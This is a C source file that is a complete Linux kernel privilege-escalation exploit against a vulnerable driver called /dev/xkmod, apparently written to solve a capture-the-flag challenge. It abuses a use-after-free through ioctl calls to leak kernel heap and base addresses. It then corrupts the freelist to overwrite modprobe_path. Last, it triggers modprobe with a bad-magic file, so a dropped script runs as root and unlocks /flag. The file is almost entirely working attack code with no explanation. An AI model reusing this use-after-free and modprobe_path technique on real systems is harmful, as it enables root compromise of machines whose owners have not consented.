#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sched.h>


/* bind the process to specific core */
void bindCore(int core){
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

long dev_fd;

typedef struct data{
    size_t *ptr;
    unsigned int offset;
    unsigned int length;
}Data;


void allocBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x1111111, data);
}


void editBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x6666666, data);
}


void readBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x7777777, data);
}


#define ROOT_SCRIPT_PATH  "/home/getshell"
#define MODPROBE_PATH 0xffffffff82444700


int main(void){
    bindCore(0);

    int dev_fd[5];
    for (int i = 0; i < 5; i++) {
        dev_fd[i] = open("/dev/xkmod", O_RDONLY);
    }


    Data data;
    data.ptr = malloc(0x1000);
    data.offset = 0;
    data.length = 0x50;
    memset(data.ptr, 0, 0x1000);


    allocBuf(dev_fd[0], &data);
    editBuf(dev_fd[0], &data);
    close(dev_fd[0]);

    readBuf(dev_fd[1], &data);
    printf("%x\n", data.ptr[0]);

    size_t kernel_heap_leak = data.ptr[0];
    size_t page_offset_base = kernel_heap_leak & 0xfffffffff0000000;
    printf("%x\n", page_offset_base);
    

    data.ptr[0] = page_offset_base + 0x9d000 - 0x10;
    data.offset = 0;
    data.length = 8;
    editBuf(dev_fd[1], &data);
    allocBuf(dev_fd[1], &data);
    allocBuf(dev_fd[1], &data);
    

    data.length = 0x40;
    readBuf(dev_fd[1], &data);
    if ((data.ptr[2] & 0xfff) != 0x30) {
        printf("[!] invalid data leak: 0x%lx\n", data.ptr[2]);
    }
    size_t kernel_base = data.ptr[2] - 0x30;
    size_t kernel_offset = kernel_base - 0xffffffff81000000;


    char root_cmd[] = "#!/bin/sh\nchmod 777 /flag";
    size_t root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);
    write(root_script_fd, root_cmd, sizeof(root_cmd));
    close(root_script_fd);
    system("chmod +x " ROOT_SCRIPT_PATH);

    allocBuf(dev_fd[1], &data);
    close(dev_fd[1]);

    data.ptr[0] = kernel_offset + MODPROBE_PATH - 0x10;
    data.offset = 0;
    data.length = 0x8;

    editBuf(dev_fd[2], &data);
    allocBuf(dev_fd[2], &data);
    allocBuf(dev_fd[2], &data);

    strcpy((char *) &data.ptr[2], ROOT_SCRIPT_PATH);
    data.length = 0x30;
    editBuf(dev_fd[2], &data);

    /* trigger the fake modprobe_path */
    system("echo -e '\\xff\\xff\\xff\\xff' > /home/fake");
    system("chmod +x /home/fake");
    system("/home/fake");

    
    char flag[0x100];
    memset(flag, 0, sizeof(flag));

    size_t flag_fd = open("/flag", O_RDWR);

    read(flag_fd, flag, sizeof(flag));
    printf("%s\n", flag);

    return 0;
}